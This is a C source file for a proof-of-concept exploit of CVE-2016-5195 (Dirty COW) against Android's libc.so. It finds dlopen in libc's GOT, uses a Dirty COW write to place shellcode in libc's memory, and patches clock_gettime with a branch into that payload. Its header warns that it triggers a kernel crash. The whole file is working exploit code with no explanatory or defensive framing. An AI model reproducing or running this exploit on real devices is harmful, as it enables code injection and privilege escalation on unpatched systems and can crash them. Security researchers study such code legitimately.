/*
 * CVE-2016-5195 dirtypoc
 *
 * This PoC is memory only and doesn't write anything on the filesystem.
 * /!\ Beware, it triggers a kernel crash a few minutes.
 *
 * gcc -Wall -o dirtycow-mem dirtycow-mem.c -ldl -lpthread
 */

#define _GNU_SOURCE
#include <err.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <limits.h>
#include <pthread.h>
#include <stdbool.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <elf.h>
#include "shellcode.h"
#include "utils.h"
#include "dirtycow.h"

#define LIBC_PATH	"/system/lib/libc.so"
#define SHELLCODE_LOCATION 0x60


#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif


unsigned int get_payload_location(char * lib, unsigned int *start, unsigned int * size)
{
	struct module_property mod_prop;
	if ( -1 == get_module_property( 0, lib, &mod_prop )) {
		printf("[!] get_module_info libc error\n");
		return -1;
	}
	printf("[*] %s : [%lx-%6lx : %08lx][%s][%s]\n", 
		lib, mod_prop.base, mod_prop.base+mod_prop.size, mod_prop.size, mod_prop.flags, mod_prop.path);


	Elf_Shdr shdr;
	if ( -1 == get_shdr_byoffset( lib, mod_prop.size - 1, &shdr ) ){
		printf("[!] get_shdr_byoffset error\n");
		return -1;
	}

	*start = shdr.sh_offset+shdr.sh_size;
	*size = mod_prop.size - (unsigned int)shdr.sh_offset - (unsigned int)shdr.sh_size;

	printf("[*] payload_location : %08lx - %08lx : %08lx\n", *start, *start+*size, *size);

	return 0;
	//printf("[*] last section in xp regin : %08lx - %08lx : %08lx, blank code region : %08lx - %08lx\n", 
	//	shdr.sh_offset, shdr.sh_offset+shdr.sh_size, shdr.sh_size, shdr.sh_offset+shdr.sh_size, libc_info.size);


}

int main(int argc, char *argv[])
{
	//sleep(50);
	//1, get the dlpoen address
	int dlopen_addr   = get_proc_address(LIBC_PATH, "dlopen");
	printf("[*] dlopen vitual addr: %08lx\n", dlopen_addr);

	//unsigned int got_addr, got_entry_count, i;
	Elf_Shdr got;
	if (-1 == get_shdr(LIBC_PATH, ".got", &got)) {
		printf("[!] get .got error\n");
		return -1;
	}

	struct module_property libc_prop;
	if ( -1 == get_module_property( 0, LIBC_PATH, &libc_prop )) {
		printf("[!] get_module_info libc error\n");
		return -1;
	}
	printf("[*] libc prop %08lx-%08lx, %08lx\n", libc_prop.base, libc_prop.base+libc_prop.size, libc_prop.size);
	int i = 0;

	unsigned int got_entry_count = got.sh_size / 4;
	unsigned int got_addr = libc_prop.base + got.sh_addr;
	printf("[*] libc got_addr vitual addr: %08lx, num : %d\n", got_addr, got_entry_count);

	for( i = 0; i < got_entry_count; i++){
		if ( ((int*)got_addr)[i] == dlopen_addr ){
			printf("[*] dlopen @ got %d\n", i);
			break;
		}
	}

	unsigned int dlopen_got_addr = got_addr + i * 4;
	printf("[*]dlopen_got@: %08lx\n", dlopen_got_addr);

	//start so inject, we need a function to hack

	char* victim_addr = get_proc_address(LIBC_PATH, "clock_gettime");
	//int mode;
	//mode = (int)victim_addr%2;
	printf("[*]victim_clock_gettime_addr @: %08lx \n", victim_addr);
	//if(mode){
	//	victim_addr--;
	//}
	//unsigned int playload_location = (void*)(libc_prop.base + libc_prop.size - SHELLCODE_LOCATION);

	unsigned int payload_location, size;
	//get_payload_location(LIBC_PATH, &payload_location, &size);
	payload_location = libc_prop.base + libc_prop.size - 0x60;
	printf("[*]payload_location @: %08lx, len : %08lx\n", payload_location, sizeof(loadso));

	//save payload addr data
	char * pmem_save = malloc(sizeof(loadso));
	memcpy(pmem_save, payload_location, sizeof(loadso));


	unsigned int dlopen_offset = 0;
    dlopen_offset = dlopen_got_addr - payload_location - 0x34 ;


    memcpy(&loadso[0x3c], (char*)victim_addr, 4);
    *(int*)&loadso[0x40] = ((int)victim_addr + 4  - payload_location - 0x40 - 8)/4;
    *(char*)&loadso[0x43] = 0xea;
    *(int*)&loadso[0x44] = dlopen_offset;
    printf("[*]dlopen_offset = %08lx\n", dlopen_offset);


    if ( 0 == memcmp(loadso, payload_location, 48)){
    	printf("[*] shellcode has been located\n");
    }else{
    	dirtycow_memcpy(LIBC_PATH, payload_location - libc_prop.base, sizeof(loadso), loadso);
    }

    printf("[*] code : %08lx , %08lx\n", *(int*)victim_addr, *(int*)victim_addr & 0xff000000);
    // if the hook has been installed, then do not patch again
    for(i = 0; i<10; i++){
    	if ((*(int*)victim_addr & 0xff000000) != 0xea000000){
	    	int offset = (int)payload_location-(int)victim_addr;
	    	printf("payload_location %08lx, offset %08lx\n", payload_location, offset);
	    	*(int*)&b2payload[0] = (offset-8)/4;
	    	*(char*)&b2payload[3] = 0xea;
	    	dirtycow_memcpy(LIBC_PATH, victim_addr-libc_prop.base, 4, b2payload);  
	    }else
	    	break;

	    usleep(100);
    }

    while(1){
    	getenforce();
    }

    
    free(pmem_save);
    //int fnhdr = 0xe1a0c007;  
    //dirtycow_memcpy(LIBC_PATH, victim_addr-libc_prop.base, 4, &fnhdr);       
    exit(0);

/*
    void * addr;
  	addr = (void *)((int)victim_addr & (~(PAGE_SIZE - 1)));
    mprotect (addr, PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC);
 	memcpy(victim_addr, b2payload, sizeof(b2payload));
	printf("clock_gettime() = %d\n", clock_gettime(0,0));
	exit(0);
*/
	
}
